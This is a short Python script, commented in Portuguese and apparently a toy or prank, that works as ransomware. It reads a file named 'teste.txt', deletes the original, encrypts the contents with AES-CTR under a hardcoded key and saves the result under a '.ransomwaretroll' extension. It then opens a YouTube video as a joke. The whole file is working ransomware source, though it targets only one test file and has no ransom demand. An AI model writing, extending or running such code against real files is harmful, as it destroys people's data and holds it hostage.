import os
import pyaes
import webbrowser

#funcão que dá um tempero
def abrir_youtube():
    url = "https://www.youtube.com/watch?v=4TnAKurylA8&ab_channel=MCKuzenleri"  
    webbrowser.open(url)

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

abrir_youtube()
